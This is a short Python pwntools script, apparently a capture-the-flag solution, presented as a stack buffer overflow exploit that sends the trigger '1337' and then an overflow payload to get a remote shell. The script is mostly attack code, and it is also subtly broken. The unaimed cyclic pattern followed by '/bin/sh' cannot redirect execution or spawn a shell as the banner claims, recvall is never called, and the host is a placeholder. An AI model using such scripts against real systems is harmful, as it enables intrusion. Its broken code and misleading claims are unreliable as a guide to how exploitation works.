"""
===========================================================================
🎯 Objective: Interactive Shell via Stack Buffer Overflow
💣 Vulnerability: Unconstrained Input Read (Stack-based BOF)
⚔️ Method:
  1. Bypasses the initial logic constraint by sending the required trigger token ("1337").
  2. Reaches the vulnerable code path containing an unconstrained read() function.
  3. Injects a calculated cyclic pattern to overflow the stack buffer and overwrite the Instruction Pointer.
  4. Appends the "/bin/sh" string to spawn an interactive shell.
===========================================================================
"""
  
from pwn import *
r=remote(xxxxx)

#nota che l'overflow funziona se e solamente se come primo input si manda "1337" siccome farà un
#read che sfonda un buffer
r.recvuntil(b"(1-25): ")
r.sendline(b"1337")
r.recvuntil(b"")
payload=cyclic(150)
payload+=b"/bin/sh"
r.sendline(payload)
leak=r.recvall
print(leak)
r.interactive()
